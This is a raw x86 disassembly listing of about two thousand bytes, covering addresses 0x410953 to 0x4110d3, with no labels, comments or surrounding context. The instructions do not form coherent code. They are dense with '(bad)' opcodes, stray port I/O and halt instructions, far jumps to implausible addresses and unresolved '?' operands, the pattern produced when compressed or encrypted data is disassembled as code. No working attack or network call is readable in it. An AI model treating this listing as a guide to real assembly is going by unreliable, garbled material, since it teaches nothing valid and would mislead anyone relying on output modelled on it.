  410953:	pusha  
  410954:	outs   dx,BYTE PTR ds:[esi]
  410955:	cld    
  410956:	out    0xfb,eax
  410958:	(bad)  
  410959:	cdq    
  41095a:	pop    ebx
  41095b:	cmp    eax,0xf74204c3
  410960:	cli    
  410961:	(bad)  
  410962:	dec    edx
  410963:	fist   DWORD PTR [edi-0x23d5c6e3]
  410969:	xchg   edx,eax
  41096a:	inc    eax
  41096b:	js     0x410974
  41096d:	mov    DWORD PTR [bp+si-0x7641],edi
  410972:	mov    esi,DWORD PTR [edi+0x4c]
  410975:	test   eax,0x16e7eb9d
  41097a:	mov    edx,DWORD PTR [ebx+0x62c14230]
  410980:	add    eax,0xe1819b78
  410985:	stc    
  410986:	sub    eax,0x5899f4e0
  41098b:	pop    ebx
  41098c:	mov    eax,ds:0x92c9ca5e
  410991:	dec    esp
  410992:	jmp    0x5687ea7
  410997:	or     BYTE PTR [edx-0x6140134c],ah
  41099d:	inc    edi
  41099e:	pop    eax
  41099f:	cmc    
  4109a0:	jecxz  0x410a0c
  4109a2:	jle    0x41095e
  4109a4:	clc    
  4109a5:	mov    dl,0x31
  4109a7:	mov    ebx,0x2e21db02
  4109ac:	lahf   
  4109ad:	mov    ds:0xc77b918a,al
  4109b2:	sar    BYTE PTR ds:0x53be94c5,cl
  4109b8:	and    BYTE PTR [ecx],dl
  4109ba:	daa    
  4109bb:	xchg   ebp,eax
  4109bc:	into   
  4109bd:	and    al,0x29
  4109bf:	dec    ebx
  4109c0:	fwait
  4109c1:	mov    cl,0x4b
  4109c3:	dec    edx
  4109c4:	mov    dl,0xc5
  4109c6:	out    0x10,al
  4109c8:	add    BYTE PTR [edx+eiz*1+0x1f0a98af],cl
  4109cf:	iret   
  4109d0:	dec    edx
  4109d1:	add    al,0x70
  4109d3:	xchg   edx,eax
  4109d4:	repnz push edx
  4109d6:	dec    ebx
  4109d7:	scas   eax,DWORD PTR es:[edi]
  4109d8:	inc    esp
  4109d9:	mov    WORD PTR [eax],gs
  4109db:	xchg   edx,eax
  4109dc:	xlat   BYTE PTR ds:[ebx]
  4109dd:	jmp    FWORD PTR [esi-0x6418e8b4]
  4109e3:	fwait
  4109e4:	stos   BYTE PTR es:[edi],al
  4109e5:	test   eax,0x2d9a815f
  4109ea:	(bad)  
  4109eb:	adc    al,0xff
  4109ed:	fcmovnu st,st(5)
  4109ef:	int    0x56
  4109f1:	pop    es
  4109f2:	mov    al,0x69
  4109f4:	adc    WORD PTR [ebp-0x7a],ax
  4109f8:	fadd   DWORD PTR [ebx-0x2cbeefe2]
  4109fe:	pop    es
  4109ff:	mov    ebp,0xe58cf6f8
  410a04:	xchg   ebp,ebp
  410a06:	cmc    
  410a07:	jmp    0x410a36
  410a09:	jp     0x410a09
  410a0b:	nop
  410a0c:	ins    DWORD PTR es:[edi],dx
  410a0d:	aas    
  410a0e:	lahf   
  410a0f:	test   eax,0x7f5eba7b
  410a14:	hlt    
  410a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a16:	sub    al,0x99
  410a18:	scas   al,BYTE PTR es:[edi]
  410a19:	repnz out dx,al
  410a1b:	mov    al,0x48
  410a1d:	adc    ecx,DWORD PTR ss:[esi]
  410a20:	sub    ch,BYTE PTR [edx+0x6c]
  410a23:	or     eax,0x916ea53e
  410a28:	data16 jp 0x410a7a
  410a2b:	push   ebx
  410a2c:	xchg   esp,eax
  410a2d:	aas    
  410a2e:	(bad)  
  410a30:	mov    ah,0xbf
  410a32:	push   eax
  410a33:	and    ebp,DWORD PTR [ebx]
  410a35:	cmp    esi,DWORD PTR [ecx]
  410a37:	cmc    
  410a38:	loop   0x4109f2
  410a3a:	ja     0x410a0f
  410a3c:	dec    edi
  410a3d:	jns    0x4109ca
  410a3f:	inc    ecx
  410a40:	or     ebp,ebx
  410a42:	test   DWORD PTR [ebp+0x1c000a52],ecx
  410a48:	stos   BYTE PTR es:[edi],al
  410a49:	cmp    ah,bl
  410a4b:	clc    
  410a4c:	push   ebx
  410a4d:	les    edi,FWORD PTR [edi-0x3]
  410a50:	mov    esp,0xa89d0496
  410a55:	mov    es:0x4182c2e3,eax
  410a5b:	scas   eax,DWORD PTR es:[edi]
  410a5c:	jg     0x410a85
  410a5e:	stos   BYTE PTR es:[edi],al
  410a5f:	or     edi,DWORD PTR [esi]
  410a61:	adc    edi,DWORD PTR [edi+0x44]
  410a64:	nop
  410a65:	leave  
  410a66:	pushw  ds
  410a68:	or     ebp,ecx
  410a6a:	ror    DWORD PTR [ecx+0x33],cl
  410a6d:	push   edx
  410a6e:	cmp    esp,DWORD PTR [esi]
  410a70:	lods   al,BYTE PTR ds:[esi]
  410a71:	xor    bl,BYTE PTR ds:[ebx+0x75]
  410a75:	jmp    0xf049abac
  410a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a7b:	mov    ds:0xf2f747b3,al
  410a80:	aad    0x1a
  410a82:	mov    cl,0x46
  410a84:	dec    BYTE PTR [edx+0x42]
  410a87:	push   edx
  410a88:	push   ss
  410a89:	mov    ch,BYTE PTR [esi+0x7b]
  410a8c:	or     ch,BYTE PTR ds:[ebx-0x17]
  410a90:	ret    0x7fc2
  410a93:	push   ecx
  410a94:	jne    0x410a4f
  410a96:	fdivr  DWORD PTR ds:0xb92394d1
  410a9c:	add    DWORD PTR [edx-0x58],ecx
  410a9f:	or     BYTE PTR [edi],al
  410aa1:	mov    bl,0x6e
  410aa3:	dec    ecx
  410aa4:	xor    eax,0xf1541944
  410aa9:	push   ebx
  410aaa:	es std 
  410aac:	dec    ebx
  410aad:	or     ebx,DWORD PTR [ecx-0x4f]
  410ab0:	push   0xfffffff5
  410ab2:	sub    al,BYTE PTR es:[eax+0x1a]
  410ab6:	pushf  
  410ab7:	xor    eax,0xde96730
  410abc:	pop    edx
  410abd:	ds dec ebp
  410abf:	cmc    
  410ac0:	fidiv  DWORD PTR [edi]
  410ac2:	fidivr WORD PTR [eax+0x309641b3]
  410ac8:	pop    edi
  410ac9:	sub    ebx,DWORD PTR [esi]
  410acb:	mov    dl,BYTE PTR [ecx+0x2f]
  410ace:	cmp    eax,0x90478ced
  410ad3:	pop    ebx
  410ad4:	sub    eax,0x94f4cdea
  410ad9:	call   0x31232b26
  410ade:	(bad)  
  410adf:	xor    al,0x65
  410ae1:	stos   DWORD PTR es:[edi],eax
  410ae2:	mov    esi,0xb1f9eaa4
  410ae7:	dec    eax
  410ae8:	in     al,dx
  410ae9:	add    ch,dh
  410aeb:	pop    ss
  410aec:	adc    BYTE PTR [edx],0xaa
  410aef:	mov    al,ds:0x71a32db0
  410af4:	imul   ebp,DWORD PTR [ebp*8+0x51daa181],0xd76c6b54
  410aff:	in     al,0x84
  410b01:	cs pop eax
  410b03:	and    BYTE PTR [eax],0x94
  410b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b07:	mov    ah,BYTE PTR [ebx+0x59]
  410b0a:	ins    DWORD PTR es:[edi],dx
  410b0b:	xchg   DWORD PTR [ebx-0x7ead4bb9],ebp
  410b11:	ins    BYTE PTR es:[edi],dx
  410b12:	test   BYTE PTR [eax-0x197ac19f],bl
  410b18:	cmp    DWORD PTR [eax],ebx
  410b1a:	bound  ebp,QWORD PTR [esi+0x5a]
  410b1d:	cmp    DWORD PTR [edi+0x7d],ebx
  410b20:	mov    edi,0xa7d1376b
  410b25:	inc    ecx
  410b26:	outs   dx,DWORD PTR ds:[esi]
  410b27:	lods   al,BYTE PTR ds:[esi]
  410b28:	mov    ecx,0x210f4901
  410b2d:	sub    eax,0xb1ab357a
  410b32:	xchg   ecx,eax
  410b33:	es mov bl,0x58
  410b36:	xor    edx,DWORD PTR [esi+eiz*2-0x6cf17327]
  410b3d:	mov    BYTE PTR [eax-0x1e],dh
  410b40:	ret    0x951
  410b43:	add    cl,BYTE PTR [ebx+esi*8+0x26]
  410b47:	mov    WORD PTR [edi+eiz*8+0x2],ds
  410b4b:	push   ds
  410b4c:	fstp   st(3)
  410b4e:	imul   edi
  410b50:	cmc    
  410b51:	cmp    dl,BYTE PTR [esi-0x20]
  410b54:	push   ss
  410b55:	lds    edx,FWORD PTR [edx]
  410b57:	hlt    
  410b58:	cwde   
  410b59:	pop    ss
  410b5a:	pushf  
  410b5b:	sbb    esp,DWORD PTR [ebx]
  410b5d:	stc    
  410b5e:	outs   dx,BYTE PTR ds:[esi]
  410b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b60:	cmp    eax,0x1b1060f8
  410b65:	ret    
  410b66:	enter  0x944b,0x7e
  410b6a:	enter  0xa7ea,0xf8
  410b6e:	lds    edi,FWORD PTR [ebx+edx*8]
  410b71:	fisub  WORD PTR [esi-0x4c7027a4]
  410b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b78:	xor    DWORD PTR [edx+0x61c4c943],0xffffffc8
  410b7f:	fs ret 0xec66
  410b83:	loopne 0x410b74
  410b85:	mov    cl,0xb8
  410b87:	scas   eax,DWORD PTR es:[edi]
  410b88:	adc    eax,0x13c10fd9
  410b8d:	add    al,0xa5
  410b8f:	ror    DWORD PTR [eax+0x141b836a],1
  410b95:	dec    edi
  410b96:	sbb    cl,BYTE PTR [ecx]
  410b98:	js     0x410bee
  410b9a:	jmp    0x410bbe
  410b9c:	clc    
  410b9d:	add    dh,BYTE PTR [ebp-0x970ad5]
  410ba3:	pop    ebp
  410ba4:	sub    ecx,DWORD PTR [edi]
  410ba6:	mov    cl,0xe4
  410ba8:	stos   BYTE PTR es:[edi],al
  410ba9:	dec    ecx
  410baa:	sbb    DWORD PTR [eax+0x5e],edi
  410bad:	pop    ebx
  410bae:	iret   
  410baf:	dec    dh
  410bb1:	cmp    eax,0x8536de3d
  410bb6:	jp     0x410bcf
  410bb8:	rcr    DWORD PTR [edi-0x52],1
  410bbb:	or     al,0x3b
  410bbd:	ss xchg edi,eax
  410bbf:	and    ah,ah
  410bc1:	rol    BYTE PTR [edx-0x5a6c4d3f],cl
  410bc7:	icebp  
  410bc8:	add    ecx,DWORD PTR [ebx+0x50cd022e]
  410bce:	(bad)  
  410bcf:	sub    esp,DWORD PTR [edi+0x1f3cf057]
  410bd5:	leave  
  410bd6:	cdq    
  410bd7:	xchg   BYTE PTR [ebx],bh
  410bd9:	imul   edi,ecx,0x3a
  410bdc:	hlt    
  410bdd:	mov    ebx,0xbd147c00
  410be2:	jb     0x410c13
  410be4:	sub    DWORD PTR [esi-0x21],0x79d3664a
  410beb:	dec    edx
  410bec:	adc    edi,esp
  410bee:	imul   esp,DWORD PTR [edi+0x17],0x59
  410bf2:	add    eax,0x1783bc1a
  410bf7:	dec    esi
  410bf8:	outs   dx,BYTE PTR ds:[esi]
  410bf9:	sti    
  410bfa:	add    eax,0xc47735fa
  410bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c00:	fisub  DWORD PTR [edi+ecx*8+0x1d]
  410c04:	test   al,0x5c
  410c06:	scas   al,BYTE PTR es:[edi]
  410c07:	retf   0x7af7
  410c0a:	hlt    
  410c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c0c:	in     al,dx
  410c0d:	mov    al,0x7b
  410c0f:	sub    bh,BYTE PTR [ebp-0x33]
  410c12:	aas    
  410c13:	sti    
  410c14:	nop
  410c15:	(bad)  
  410c17:	fcmovnb st,st(3)
  410c19:	and    al,0x16
  410c1b:	mov    ah,0xec
  410c1d:	inc    edi
  410c1e:	xor    eax,0xcad17527
  410c23:	cmp    al,0x71
  410c25:	in     al,dx
  410c26:	dec    edi
  410c27:	(bad)  
  410c28:	mov    edi,0xa7afeb31
  410c2d:	(bad)  
  410c2e:	or     al,0x53
  410c30:	dec    ebp
  410c31:	ret    
  410c32:	add    eax,0xeae78126
  410c37:	out    0x8f,eax
  410c39:	push   0x81a52fee
  410c3e:	xchg   esp,eax
  410c3f:	mov    cl,0x36
  410c41:	or     BYTE PTR [ebx],cl
  410c43:	in     al,0x91
  410c45:	push   0xfed89469
  410c4a:	mov    al,0xcf
  410c4c:	test   eax,0xbbb0f8aa
  410c51:	sar    BYTE PTR [edi],0x7a
  410c54:	pop    es
  410c55:	mov    cl,0x65
  410c58:	enter  0x8409,0xc5
  410c5c:	dec    ecx
  410c5d:	ror    esi,0x50
  410c60:	cdq    
  410c61:	xchg   BYTE PTR [ecx],dl
  410c63:	jl     0x410c73
  410c65:	aas    
  410c66:	mov    ecx,0xc64eff70
  410c6b:	xchg   bh,dl
  410c6d:	mov    ecx,0xb432c029
  410c72:	xor    ah,cl
  410c74:	inc    ebp
  410c75:	sti    
  410c76:	cmc    
  410c77:	idiv   BYTE PTR [ebp+0x6ac31977]
  410c7d:	data16 lahf 
  410c7f:	(bad)  
  410c80:	ficom  WORD PTR [eax]
  410c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c83:	jns    0x410c10
  410c85:	stos   DWORD PTR es:[edi],eax
  410c86:	sbb    DWORD PTR [ebx+0x5a],0xc49a6070
  410c8d:	fidiv  DWORD PTR [ebx]
  410c8f:	cmc    
  410c90:	adc    DWORD PTR [esi-0x1b803d02],0x62bba81e
  410c9a:	add    eax,esi
  410c9c:	xchg   ebx,eax
  410c9d:	rol    DWORD PTR [esi+0x11],cl
  410ca0:	arpl   WORD PTR ds:0x9a7fd53e,di
  410ca6:	pop    ds
  410ca7:	retf   0xed4c
  410caa:	mov    WORD PTR [ebx],ss
  410cac:	xchg   esi,eax
  410cad:	rcl    BYTE PTR [ebx+edi*1-0x4dfc3425],cl
  410cb4:	jle    0x410c77
  410cb6:	inc    ecx
  410cb7:	adc    BYTE PTR [ebp+0x353bb209],bh
  410cbd:	clc    
  410cbe:	pop    esp
  410cbf:	out    dx,eax
  410cc0:	add    edx,esi
  410cc2:	repz jecxz 0x410d2d
  410cc5:	sub    dl,bh
  410cc7:	sub    eax,0xebab057
  410ccc:	inc    ebx
  410ccd:	lods   al,BYTE PTR ds:[esi]
  410cce:	xchg   DWORD PTR [ebx+0x2c],edx
  410cd1:	mul    BYTE PTR [esi+0x1b]
  410cd4:	xchg   edx,eax
  410cd5:	ja     0x410d12
  410cd7:	mov    eax,ds:0xa026fa4e
  410cdc:	out    0x46,al
  410cde:	shl    cl,cl
  410ce0:	pop    ebx
  410ce1:	fidivr DWORD PTR [edx-0x78c9b88]
  410ce7:	test   dh,bh
  410ce9:	std    
  410cea:	repz mov esi,0xb72b7a9e
  410cf0:	lods   eax,DWORD PTR ds:[esi]
  410cf1:	mov    eax,0xc05a1ed5
  410cf6:	out    dx,eax
  410cf7:	in     eax,0xdd
  410cf9:	rcl    edi,0x62
  410cfc:	cmc    
  410cfd:	repz lahf 
  410cff:	stos   DWORD PTR es:[edi],eax
  410d00:	mov    eax,ds:0x3865f65
  410d05:	jp     0x410d29
  410d07:	iret   
  410d08:	push   ss
  410d09:	mov    bh,dl
  410d0b:	push   ds
  410d0c:	jecxz  0x410c9b
  410d0e:	or     al,0x23
  410d10:	and    BYTE PTR [edx-0x1c],bl
  410d13:	int3   
  410d14:	shr    BYTE PTR [edx-0x69f8e2a1],1
  410d1a:	xor    edx,DWORD PTR [edi-0x65e72d81]
  410d20:	daa    
  410d21:	lods   al,BYTE PTR ds:[esi]
  410d22:	xor    DWORD PTR [ebp-0x775760b1],ecx
  410d28:	fiadd  WORD PTR ds:0x56fc79f8
  410d2e:	xchg   BYTE PTR [ecx],dl
  410d30:	fisttp DWORD PTR [ecx]
  410d32:	rcr    DWORD PTR [ebx+0x38b84232],cl
  410d38:	dec    ebx
  410d39:	push   0x91db3ed5
  410d3e:	pop    esp
  410d3f:	data16 shl BYTE PTR [ecx-0x5c],cl
  410d43:	push   edx
  410d44:	mov    eax,ds:0x6ccd7d7
  410d49:	sbb    al,0x74
  410d4b:	lahf   
  410d4c:	adc    al,0x3c
  410d4e:	loopne 0x410cd7
  410d50:	int    0xec
  410d52:	dec    esp
  410d53:	push   ecx
  410d54:	arpl   WORD PTR [ebp-0x73cd904a],cx
  410d5a:	aaa    
  410d5b:	xchg   al,ah
  410d5d:	gs add eax,0x1ed5e3f9
  410d63:	shr    BYTE PTR [eax-0xa],0xeb
  410d67:	lock mov ds:0x30c78959,eax
  410d6d:	and    DWORD PTR [edi],eax
  410d6f:	stos   DWORD PTR es:[edi],eax
  410d70:	pop    ecx
  410d71:	sbb    dl,BYTE PTR [ebp+0x16]
  410d74:	mov    ebx,0xdc00fe56
  410d79:	xlat   BYTE PTR ds:[ebx]
  410d7a:	scas   eax,DWORD PTR es:[edi]
  410d7b:	and    DWORD PTR [esi+0x30],0x11b6f23b
  410d82:	jbe    0x410da5
  410d84:	loopne 0x410da1
  410d86:	sbb    al,BYTE PTR [esp+ebp*2+0x5c6fbf94]
  410d8d:	aad    0x13
  410d8f:	je     0x410d39
  410d91:	imul   ebp,DWORD PTR [esi],0x58
  410d94:	adc    eax,0xff648f4f
  410d99:	aas    
  410d9a:	rcl    BYTE PTR [eax],cl
  410d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d9d:	xchg   DWORD PTR [ecx+0x62e97ff3],edx
  410da3:	jo     0x410dd1
  410da5:	add    dl,bl
  410da7:	repnz sub eax,0x425bcdb
  410dad:	jne    0x410d6e
  410daf:	dec    ebp
  410db0:	and    BYTE PTR [ecx],dh
  410db2:	arpl   WORD PTR [ebp+0x9],bp
  410db5:	rcl    BYTE PTR [edx],1
  410db7:	and    ebp,DWORD PTR [edi]
  410db9:	outs   dx,BYTE PTR ds:[esi]
  410dba:	repnz dec ebp
  410dbc:	enter  0x2b90,0xf8
  410dc0:	imul   esp,eax,0xffffffa6
  410dc3:	jno    0x410d57
  410dc5:	aad    0xf8
  410dc7:	push   edx
  410dc8:	mov    bl,0x2f
  410dca:	lods   eax,DWORD PTR ds:[esi]
  410dcb:	pminsw mm1,QWORD PTR [edx]
  410dce:	(bad)  
  410dcf:	push   ss
  410dd0:	imul   esp,DWORD PTR [esi*2+0x648e95fe],0xe4f031b6
  410ddb:	mov    ds:0x3870bc55,al
  410de0:	loop   0x410dea
  410de2:	sub    ecx,DWORD PTR [ebx+0x29ada0a9]
  410de8:	xor    bl,dh
  410dea:	clc    
  410deb:	ret    0x68ed
  410dee:	aad    0x3b
  410df0:	add    al,0x48
  410df2:	dec    ch
  410df4:	xor    ecx,DWORD PTR [esi]
  410df6:	sbb    ebx,DWORD PTR [eax]
  410df8:	sbb    BYTE PTR ss:[ecx],ch
  410dfb:	or     DWORD PTR [ebx],edx
  410dfd:	xchg   esi,eax
  410dfe:	mov    dl,BYTE PTR [esi-0x40]
  410e01:	cmp    DWORD PTR [edx+0x53],eax
  410e04:	xor    al,0xc8
  410e06:	xchg   bh,ch
  410e08:	mov    al,ds:0x1fa0be7b
  410e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e0e:	adc    eax,0x12b46b66
  410e13:	pop    esi
  410e14:	and    al,0xb
  410e16:	fdivr  DWORD PTR [esi+0x24d715d3]
  410e1c:	add    DWORD PTR [esi],ecx
  410e1e:	adc    BYTE PTR [ecx+0x62add934],al
  410e24:	out    dx,eax
  410e25:	jp     0x410e41
  410e27:	cmp    ebp,DWORD PTR [ebx+0x49273f1f]
  410e2d:	mov    WORD PTR [eax+ebp*1+0x276598da],?
  410e34:	mov    al,0x34
  410e36:	push   esp
  410e37:	fs int 0x82
  410e3a:	icebp  
  410e3b:	imul   esi,DWORD PTR [edi+0x3ad9967b],0x1d
  410e42:	xor    al,BYTE PTR [edx+ecx*4-0x46]
  410e46:	icebp  
  410e47:	pusha  
  410e48:	mov    al,0xd1
  410e4a:	jae    0x410dee
  410e4c:	popf   
  410e4d:	shl    BYTE PTR [ebx+0x5d],0x6f
  410e51:	pop    es
  410e52:	imul   ebp,ecx,0x4
  410e55:	cmc    
  410e56:	clc    
  410e57:	(bad)  
  410e59:	inc    esp
  410e5a:	push   esi
  410e5b:	dec    edi
  410e5c:	loopne 0x410ed8
  410e5e:	rcr    DWORD PTR [esi+0x79],0x5
  410e62:	mov    ebx,0xa2bf9a20
  410e67:	inc    ecx
  410e68:	xchg   ecx,eax
  410e69:	ins    DWORD PTR es:[edi],dx
  410e6a:	inc    ebp
  410e6b:	jae    0x410eb2
  410e6d:	fld    DWORD PTR [ebp+0x415deb70]
  410e73:	and    bl,BYTE PTR [eax+0x7bdf7e0c]
  410e79:	leave  
  410e7a:	ds retf 0xf568
  410e7e:	or     bl,bl
  410e80:	(bad)
  410e83:	lock jb 0x410e0f
  410e86:	cli    
  410e87:	pop    edi
  410e88:	or     dh,cl
  410e8a:	mov    esp,DWORD PTR [edx]
  410e8c:	(bad)
  410e8f:	cli    
  410e90:	xor    bl,0x75
  410e93:	cmp    eax,0xc77357e4
  410e98:	scas   eax,DWORD PTR es:[edi]
  410e99:	loope  0x410e46
  410e9b:	outs   dx,DWORD PTR ds:[esi]
  410e9c:	cdq    
  410e9d:	mov    WORD PTR [edx-0xfe80ee2],es
  410ea3:	mov    bh,0x13
  410ea5:	inc    ecx
  410ea6:	sbb    DWORD PTR [ebx],ebx
  410ea8:	in     al,dx
  410ea9:	sbb    eax,0x73923182
  410eae:	mov    cl,BYTE PTR [ecx+0x7da91eb6]
  410eb4:	test   al,0x12
  410eb6:	push   eax
  410eb7:	or     al,0xdf
  410eb9:	imul   ebx,eax,0x79
  410ebc:	leave  
  410ebd:	adc    esi,ebp
  410ebf:	inc    ecx
  410ec0:	pop    ebx
  410ec1:	mov    edi,0x409479e6
  410ec6:	mov    dl,bh
  410ec8:	outs   dx,DWORD PTR ds:[esi]
  410ec9:	jb     0x410e9e
  410ecb:	loope  0x410f2f
  410ecd:	and    al,0xda
  410ecf:	mov    dl,0xd9
  410ed1:	int    0x6e
  410ed3:	cmp    eax,edx
  410ed5:	dec    ebx
  410ed6:	cs mov bl,0x47
  410ed9:	das    
  410eda:	lods   al,BYTE PTR ds:[esi]
  410edb:	js     0x410f11
  410edd:	stos   BYTE PTR es:[edi],al
  410ede:	sbb    DWORD PTR [ebx+0x5225a275],edi
  410ee4:	pop    esi
  410ee5:	mov    ds:0x7c05bc90,al
  410eea:	popa   
  410eeb:	jge    0x410ee9
  410eed:	repz inc edi
  410eef:	daa    
  410ef0:	xchg   edx,eax
  410ef1:	push   0xffffffda
  410ef3:	push   es
  410ef4:	mov    ch,0x9
  410ef6:	(bad)
  410ef9:	add    DWORD PTR [eax],0xffffffb7
  410efc:	mov    ds:0x6f2e198c,al
  410f01:	test   eax,0xd77ab5e1
  410f06:	dec    esp
  410f07:	xchg   ecx,ebx
  410f09:	ja     0x410f74
  410f0b:	call   0x3899:0xe910236e
  410f12:	sbb    esi,DWORD PTR [eax]
  410f14:	or     BYTE PTR [ecx-0x74],bl
  410f17:	repz loop 0x410ece
  410f1a:	bound  ebp,QWORD PTR [ebx]
  410f1c:	jno    0x410ebb
  410f1e:	jle    0x410f5d
  410f20:	daa    
  410f21:	outs   dx,BYTE PTR ds:[esi]
  410f22:	out    dx,al
  410f23:	inc    eax
  410f24:	loop   0x410eda
  410f26:	push   eax
  410f27:	(bad)  
  410f28:	call   DWORD PTR [esi-0x53]
  410f2b:	push   cs
  410f2c:	xor    DWORD PTR [ebx],edx
  410f2e:	mulps  xmm7,xmm3
  410f31:	retf   
  410f32:	pop    ss
  410f33:	fcmovu st,st(1)
  410f35:	or     DWORD PTR [ecx],edi
  410f37:	sbb    BYTE PTR [edx],0x3f
  410f3a:	aad    0x77
  410f3c:	mov    eax,0x2bf69147
  410f42:	push   edi
  410f43:	std    
  410f44:	int3   
  410f45:	js     0x410f30
  410f47:	je     0x410f2f
  410f49:	mov    ?,WORD PTR [edi+0x41]
  410f4c:	sbb    ebx,DWORD PTR [edx]
  410f4e:	(bad)  
  410f4f:	cli    
  410f50:	fwait
  410f51:	push   0x5f
  410f53:	cmp    esi,DWORD PTR [edi]
  410f55:	sub    ah,BYTE PTR [esp+edx*8+0x14]
  410f59:	jle    0x410f9a
  410f5b:	imul   edi,ebx,0x74
  410f5e:	adc    DWORD PTR [edx+0x3fb2f837],0x25
  410f65:	scas   al,BYTE PTR es:[edi]
  410f66:	adc    DWORD PTR [ecx],ebp
  410f68:	inc    edx
  410f69:	sbb    cl,dl
  410f6b:	and    eax,0xa91b294d
  410f70:	and    BYTE PTR [esi-0x685ba61e],0x80
  410f77:	add    al,0x97
  410f79:	fild   WORD PTR [eax+0x5c426072]
  410f7f:	in     eax,0x3
  410f81:	cwde   
  410f82:	and    ah,BYTE PTR [eax]
  410f84:	lock mov eax,ds:0x91bb4edf
  410f8a:	cdq    
  410f8b:	rcr    DWORD PTR [edi],0x2f
  410f8e:	fadd   DWORD PTR [esi-0x67]
  410f91:	jb     0x410fbb
  410f93:	dec    ecx
  410f94:	retf   
  410f95:	ficom  DWORD PTR [esi+edx*2]
  410f98:	jno    0x410ff5
  410f9a:	mov    esp,0xea1299c5
  410f9f:	pop    es
  410fa0:	aaa    
  410fa1:	gs and edi,eax
  410fa4:	cmp    esi,DWORD PTR [ebx]
  410fa6:	lds    eax,FWORD PTR [ecx]
  410fa8:	test   eax,0x6fd1eaaf
  410fad:	jbe    0x410fdf
  410faf:	sub    eax,0x2accda1a
  410fb4:	mov    ds:0xc812774c,eax
  410fb9:	jmp    0xcf0e87ad
  410fbe:	loop   0x410fbb
  410fc0:	pusha  
  410fc1:	push   ss
  410fc2:	sbb    DWORD PTR [ecx],0xffffff81
  410fc5:	adc    eax,0xed937c3b
  410fca:	push   ds
  410fcb:	push   edx
  410fcc:	rcl    ecx,1
  410fce:	lods   eax,DWORD PTR ds:[esi]
  410fcf:	mov    WORD PTR [eax+0x5a128df2],?
  410fd5:	in     eax,dx
  410fd6:	aas    
  410fd7:	jae    0x410f64
  410fd9:	retf   0x808e
  410fdc:	shr    bh,1
  410fde:	jnp    0x41105d
  410fe0:	xchg   edi,eax
  410fe1:	pop    edi
  410fe2:	fmul   DWORD PTR [ebx-0x688d58bb]
  410fe8:	adc    ecx,0xffffffd6
  410feb:	xor    dh,BYTE PTR [edx+0x54dafe38]
  410ff1:	int3   
  410ff2:	out    0xf5,al
  410ff4:	and    edx,ecx
  410ff6:	mov    ebx,0x233b3677
  410ffb:	clc    
  410ffc:	cmc    
  410ffd:	or     ch,BYTE PTR [ebp-0x22343f59]
  411003:	cmp    DWORD PTR [ebx-0xd0053df],esi
  411009:	outs   dx,DWORD PTR ds:[esi]
  41100a:	push   ds
  41100b:	push   edi
  41100c:	das    
  41100d:	mov    al,BYTE PTR [esi]
  41100f:	cmp    esi,DWORD PTR [ebx]
  411011:	hlt    
  411012:	std    
  411013:	hlt    
  411014:	cmp    BYTE PTR [ecx-0x74],bh
  411017:	dec    ebp
  411018:	cmp    ch,BYTE PTR [edx+0x36]
  41101b:	out    dx,eax
  41101c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41101d:	sub    ch,dh
  41101f:	les    edx,FWORD PTR [edx]
  411021:	cli    
  411022:	es test al,0x96
  411025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411026:	dec    esi
  411027:	repnz mov dh,0x45
  41102a:	add    eax,0xfa955694
  41102f:	dec    ebx
  411030:	add    eax,0x2f0fb416
  411035:	push   ebp
  411036:	cmc    
  411037:	cdq    
  411038:	repz mov bh,0x1f
  41103b:	test   eax,0x27f0c771
  411040:	mov    cl,0xb9
  411042:	test   BYTE PTR [ebx-0x1b],bh
  411045:	imul   esi,DWORD PTR [edi+0x4c],0x48
  411049:	push   ecx
  41104a:	add    esi,DWORD PTR [edi+0x2a]
  41104d:	cmp    BYTE PTR [ebp-0x6fc46990],cl
  411053:	cmp    al,0x3a
  411055:	ja     0x41105a
  411057:	rol    DWORD PTR [esi+0x7c9e6d1d],0x84
  41105e:	jno    0x4110db
  411060:	ret    
  411061:	into   
  411062:	adc    eax,0xdcd500db
  411067:	mov    ds:0x95b5679b,eax
  41106c:	dec    ebp
  41106d:	stos   DWORD PTR es:[edi],eax
  41106e:	mov    ds:0x2bec4377,al
  411073:	outs   dx,DWORD PTR ds:[esi]
  411074:	jle    0x411038
  411076:	lahf   
  411077:	xor    ebp,DWORD PTR [ebx+0x71]
  41107a:	push   esp
  41107b:	adc    eax,0x66cae2f3
  411080:	xchg   esp,eax
  411081:	pop    eax
  411082:	xchg   edx,eax
  411083:	into   
  411084:	add    al,0x78
  411086:	sti    
  411087:	and    DWORD PTR [esi],edi
  411089:	lods   al,BYTE PTR ds:[esi]
  41108a:	xchg   esp,eax
  41108b:	xchg   ebp,eax
  41108c:	js     0x411074
  41108e:	pop    eax
  41108f:	icebp  
  411090:	and    DWORD PTR [ebp-0x7f659165],edx
  411096:	fcomip st,st(0)
  411098:	jmp    0x411101
  41109a:	inc    ecx
  41109b:	lods   eax,DWORD PTR ds:[esi]
  41109c:	retf   
  41109d:	mov    dl,0x65
  41109f:	xchg   edx,eax
  4110a0:	shl    DWORD PTR [edi],cl
  4110a2:	jnp    0x41105f
  4110a4:	retf   
  4110a5:	sbb    ch,BYTE PTR [eax]
  4110a7:	mov    ecx,0xd70ad32b
  4110ac:	inc    edi
  4110ad:	or     eax,0xd10e4158
  4110b2:	aam    0x8a
  4110b4:	div    eax
  4110b6:	out    dx,al
  4110b7:	lahf   
  4110b8:	inc    eax
  4110b9:	mov    edi,0x295cb87d
  4110be:	out    0xb7,al
  4110c0:	mov    ebp,0x48a68c52
  4110c5:	mov    ?,WORD PTR [eax+0xc]
  4110c8:	pop    esi
  4110c9:	leave  
  4110ca:	cmp    edi,DWORD PTR [edi-0xf]
  4110cd:	adc    ch,dl
  4110cf:	mov    ch,0x5
  4110d1:	out    dx,al
  4110d2:	fwait
  4110d3:	icebp  
